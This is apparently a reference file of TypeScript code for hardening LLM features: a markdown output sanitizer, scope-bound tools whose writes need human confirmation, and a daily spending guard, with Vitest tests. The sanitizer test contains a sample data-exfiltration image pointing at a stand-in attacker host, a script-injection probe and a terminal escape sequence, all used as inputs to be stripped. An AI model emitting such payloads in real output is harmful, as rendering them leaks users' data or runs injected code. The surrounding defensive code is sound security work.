# LLM Security Code

Code for [secure-llm-features](./SKILL.md); reasons in [security-patterns.md](./security-patterns.md).
Tested: `tsc --strict` and Vitest 5.0.3 (the sanitizer removed an exfiltration image, raw HTML and an ANSI clear-screen; a user without the scope never saw the tool; a write became a proposal that only the same user could confirm; the budget guard blocked at the limit; the Postgres store accumulated two concurrent writes to 0.5 against Postgres 18.6).

## Output sanitizer

Run it before rendering, and render with a renderer that escapes HTML. With an empty `allowedHosts` every image and link target is removed.

```ts
// src/platform/llm-security/output.ts
/**
 * Model output is untrusted input to whatever renders it. Apply before it reaches a browser, terminal or IDE.
 * Defaults: no raw HTML, no images or links to hosts you did not allow, no terminal control sequences.
 */
// eslint-disable-next-line no-control-regex
const ANSI = /\u001b\[[0-?]*[ -/]*[@-~]|\u001b\][^\u0007\u001b]*(?:\u0007|\u001b\\)|[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g;

export function sanitizeModelMarkdown(md: string, allowedHosts: readonly string[] = []): string {
  const allowed = (raw: string): boolean => {
    try {
      const u = new URL(raw);
      return u.protocol === 'https:' && allowedHosts.includes(u.hostname) && u.search === '' && u.hash === '';
    } catch {
      return false; // relative or malformed: drop
    }
  };
  return md
    .replace(ANSI, '')
    .replace(/<[^>]*>/g, '') // raw HTML out; the renderer must escape what is left
    // images auto-load: a query string in the URL can carry stolen data to an attacker
    .replace(/!\[([^\]]*)\]\(\s*([^)\s]+)[^)]*\)/g, (_m, alt: string, url: string) => (allowed(url) ? `![${alt}](${url})` : `[image removed: ${alt}]`))
    .replace(/\[([^\]]+)\]\(\s*([^)\s]+)[^)]*\)/g, (_m, text: string, url: string) => (allowed(url) ? `[${text}](${url})` : text));
}
```

## Tools bound to the principal

```ts
// src/platform/llm-security/tools.ts
import { z } from 'zod';

/** Identity of the HUMAN, from the verified session or token. Never from the prompt, a tool argument, or model output. */
export interface Principal {
  userId: string;
  tenantId: string;
  scopes: ReadonlySet<string>;
}

/** Type-erased tool: `defineTool` keeps the input/output types honest, the registry only needs this shape. */
export interface Tool {
  name: string;
  description: string;
  requiredScope: string;
  effect: 'read' | 'write';
  parse(raw: unknown): { ok: true; input: unknown } | { ok: false; error: string };
  run(p: Principal, input: unknown): Promise<unknown>;
}

export function defineTool<I extends z.ZodType, O>(t: {
  name: string; description: string; input: I; requiredScope: string; effect: 'read' | 'write';
  run(p: Principal, input: z.infer<I>): Promise<O>;
}): Tool {
  return {
    name: t.name, description: t.description, requiredScope: t.requiredScope, effect: t.effect,
    parse(raw) {
      const r = t.input.safeParse(raw);
      return r.success ? { ok: true, input: r.data } : { ok: false, error: `Invalid input: ${r.error.issues.map((i) => `${i.path.join('.')}: ${i.message}`).join('; ')}` };
    },
    run: (p, input) => t.run(p, input as z.infer<I>),
  };
}

interface PendingAction { tool: string; summary: string; input: unknown; principal: Principal }
const pending = new Map<string, PendingAction>(); // production: a table with expiry, keyed by id + userId

export type CallResult =
  | { ok: true; value: unknown }
  | { ok: false; error: string }
  | { ok: 'needs_confirmation'; actionId: string; summary: string };

/** The model never receives a tool it lacks the scope for, and never supplies identity. */
export function bindTools(p: Principal, tools: Tool[]) {
  const visible = tools.filter((t) => p.scopes.has(t.requiredScope));
  return {
    descriptors: visible.map((t) => ({ name: t.name, description: t.description })),
    async call(name: string, raw: unknown): Promise<CallResult> {
      const t = visible.find((x) => x.name === name);
      if (!t) return { ok: false, error: `Unknown tool "${name}".` }; // same answer for "forbidden" and "missing": no scope probing
      const parsed = t.parse(raw);
      if (!parsed.ok) return parsed;
      if (t.effect === 'write') {
        const actionId = crypto.randomUUID();
        const summary = `${name} ${JSON.stringify(parsed.input)}`;
        pending.set(actionId, { tool: name, summary, input: parsed.input, principal: p });
        return { ok: 'needs_confirmation', actionId, summary };
      }
      return { ok: true, value: await t.run(p, parsed.input) };
    },
    /** Called by your UI/API handler when the user clicks confirm. Never exposed to the model. */
    async confirm(actionId: string): Promise<unknown> {
      const a = pending.get(actionId);
      if (!a || a.principal.userId !== p.userId) throw new Error('No such pending action');
      pending.delete(actionId);
      const t = visible.find((x) => x.name === a.tool);
      if (!t) throw new Error('Tool no longer permitted');
      return t.run(a.principal, a.input);
    },
  };
}
```

Use it like this. The tool reads `p.userId`, never an argument:

```ts
// src/features/orders/tools.ts (example; ordersRepo is yours)
import { z } from 'zod';
import { defineTool } from '../../platform/llm-security/tools.js';

export const myOrders = defineTool({
  name: 'my_orders',
  description: 'List the signed-in user\'s recent orders. Returns id, date and status for at most 10 orders.',
  input: z.object({ status: z.enum(['open', 'shipped']).optional() }),
  requiredScope: 'orders:read',
  effect: 'read',
  run: async (p, input) => ordersRepo.listForUser(p.tenantId, p.userId, input.status), // repository filters by p, always
});
```

## Budget guard

```ts
// src/platform/llm-security/budget.ts
export interface BudgetStore {
  /** Atomically add `usd` to the user's spend for `day` (UTC, YYYY-MM-DD) and return the new total. */
  add(userId: string, day: string, usd: number): Promise<number>;
  total(userId: string, day: string): Promise<number>;
}

export class BudgetExceeded extends Error {
  constructor(readonly userId: string) { super('Daily LLM budget exceeded'); }
}

const today = () => new Date().toISOString().slice(0, 10);

/** Check BEFORE the call with a worst-case estimate; record the real cost AFTER. */
export function userBudget(store: BudgetStore, dailyLimitUsd: number) {
  return {
    async guard<T>(userId: string, worstCaseUsd: number, fn: () => Promise<{ costUsd: number } & T>): Promise<{ costUsd: number } & T> {
      if ((await store.total(userId, today())) + worstCaseUsd > dailyLimitUsd) throw new BudgetExceeded(userId);
      const r = await fn();
      await store.add(userId, today(), r.costUsd);
      return r;
    },
  };
}

export function memoryStore(): BudgetStore {
  const m = new Map<string, number>();
  const key = (u: string, d: string) => `${u}|${d}`;
  return {
    async add(u, d, usd) { const n = (m.get(key(u, d)) ?? 0) + usd; m.set(key(u, d), n); return n; },
    async total(u, d) { return m.get(key(u, d)) ?? 0; },
  };
}
```

```ts
// src/platform/llm-security/budget-pg.ts
import type { Pool } from 'pg';
import type { BudgetStore } from './budget.js';

/**
 * create table llm_usage (user_id text not null, day date not null, usd numeric(12,6) not null default 0, primary key (user_id, day));
 * One row per user per day; the upsert is atomic, so concurrent calls cannot lose an update.
 */
export function pgBudgetStore(pool: Pool): BudgetStore {
  return {
    async add(userId, day, usd) {
      const r = await pool.query(
        `insert into llm_usage (user_id, day, usd) values ($1, $2, $3)
         on conflict (user_id, day) do update set usd = llm_usage.usd + excluded.usd
         returning usd::float8 as usd`,
        [userId, day, usd]);
      return r.rows[0].usd as number;
    },
    async total(userId, day) {
      const r = await pool.query('select usd::float8 as usd from llm_usage where user_id = $1 and day = $2', [userId, day]);
      return (r.rows[0]?.usd as number | undefined) ?? 0;
    },
  };
}
```

```sql
-- migrations/0002_llm_usage.sql
create table llm_usage (
  user_id text    not null,
  day     date    not null,
  usd     numeric(12, 6) not null default 0,
  primary key (user_id, day)
);
-- grant select, insert, update on llm_usage to <app role>;
```

Wiring (the worst-case estimate is `await llm.countTokens(req)` times the input price plus `maxTokens` times the output price; for small, bounded inputs a constant is enough):

```ts
// src/features/summarize.route.ts (excerpt)
const result = await budget.guard(principal.userId, 0.02, () => summarizeTicket(llm, text));
// BudgetExceeded -> 429 with Retry-After; any other error -> the usual mapping
```

## Tests

```ts
// tests/security.test.ts
import pg from 'pg';
import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import { sanitizeModelMarkdown } from '../src/platform/llm-security/output.js';
import { bindTools, defineTool, type Principal } from '../src/platform/llm-security/tools.js';
import { BudgetExceeded, memoryStore, userBudget } from '../src/platform/llm-security/budget.js';
import { pgBudgetStore } from '../src/platform/llm-security/budget-pg.js';

describe('sanitizeModelMarkdown', () => {
  it('drops exfiltration images, raw html and terminal escapes', () => {
    const out = sanitizeModelMarkdown('![x](https://evil.test/p.png?d=SECRET) <script>alert(1)</script> \u001b[2Jhi [a](https://evil.test) ![ok](https://cdn.example.com/a.png)', ['cdn.example.com']);
    expect(out).not.toContain('evil.test');
    expect(out).not.toContain('<script>');
    expect(out).not.toContain('\u001b');
    expect(out).toContain('![ok](https://cdn.example.com/a.png)');
  });
});

describe('bindTools', () => {
  const read = defineTool({ name: 'my_orders', description: 'List my orders', input: z.object({}), requiredScope: 'orders:read', effect: 'read',
    run: async (p) => [`order of ${p.userId}`] });
  const cancel = defineTool({ name: 'cancel_order', description: 'Cancel an order', input: z.object({ orderId: z.string() }), requiredScope: 'orders:write', effect: 'write',
    run: async (p, i) => `cancelled ${i.orderId} for ${p.userId}` });
  const alice: Principal = { userId: 'alice', tenantId: 't', scopes: new Set(['orders:read', 'orders:write']) };
  const bob: Principal = { userId: 'bob', tenantId: 't', scopes: new Set(['orders:read']) };

  it('scopes tools by the principal and ignores identity in input', async () => {
    const t = bindTools(alice, [read, cancel]);
    expect(await t.call('my_orders', { userId: 'bob' })).toEqual({ ok: true, value: ['order of alice'] });
    expect(bindTools(bob, [read, cancel]).descriptors.map((d) => d.name)).toEqual(['my_orders']);
    expect(await bindTools(bob, [read, cancel]).call('cancel_order', { orderId: '1' })).toEqual({ ok: false, error: 'Unknown tool "cancel_order".' });
  });
  it('turns writes into proposals that only the same human can confirm', async () => {
    const t = bindTools(alice, [read, cancel]);
    const r = await t.call('cancel_order', { orderId: '7' });
    expect(r).toMatchObject({ ok: 'needs_confirmation' });
    if (r.ok !== 'needs_confirmation') throw new Error('unreachable');
    await expect(bindTools(bob, [read, cancel]).confirm(r.actionId)).rejects.toThrow();
    expect(await t.confirm(r.actionId)).toBe('cancelled 7 for alice');
  });
});

describe('userBudget', () => {
  it('blocks when the worst case would exceed the daily limit', async () => {
    const b = userBudget(memoryStore(), 0.01);
    await b.guard('u', 0.005, async () => ({ costUsd: 0.008 }));
    await expect(b.guard('u', 0.005, async () => ({ costUsd: 0 }))).rejects.toBeInstanceOf(BudgetExceeded);
  });
});


describe.skipIf(!process.env.TEST_DATABASE_URL)('pgBudgetStore', () => {
  it('accumulates atomically per user and day (table from the migration in budget-pg.ts)', async () => {
    const pool = new pg.Pool({ connectionString: process.env.TEST_DATABASE_URL });
    await pool.query("delete from llm_usage where user_id = 'budget-test'");
    const s = pgBudgetStore(pool);
    await Promise.all([s.add('budget-test', '2026-10-09', 0.25), s.add('budget-test', '2026-10-09', 0.25)]);
    expect(await s.total('budget-test', '2026-10-09')).toBeCloseTo(0.5);
    expect(await s.total('budget-test', '2026-10-10')).toBe(0);
    await pool.end();
  });
});
```
